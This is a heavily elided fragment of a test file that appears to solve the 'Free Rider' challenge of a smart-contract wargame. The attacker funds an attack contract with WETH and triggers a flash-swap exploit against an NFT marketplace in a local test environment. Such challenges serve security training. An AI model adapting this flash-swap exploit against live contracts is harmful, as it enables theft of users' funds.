...
describe("[Challenge] Free Rider", function () {
  ...
  it("Exploit", async function () {
    ...
    this.attackContract = await (
      ...
      this.uniswapPair.token0(),
      this.uniswapPair.token1(),
      this.nft.address,
    ...
    await this.weth
      .connect(attacker)
      .deposit({ value: ethers.utils.parseEther("0.4") });

    // Transfer WETH to AttackContract to cover Fees
    await this.weth
      .connect(attacker)
      .transfer(this.attackContract.address, ethers.utils.parseEther("0.4"));

    // Make sure AttackContract receives WETH
    expect(await this.weth.balanceOf(this.attackContract.address)).to.be.equal(
    ...
    await this.attackContract
      .connect(attacker)
      .flashSwapAndExploit(ethers.utils.parseEther("15"));
  });
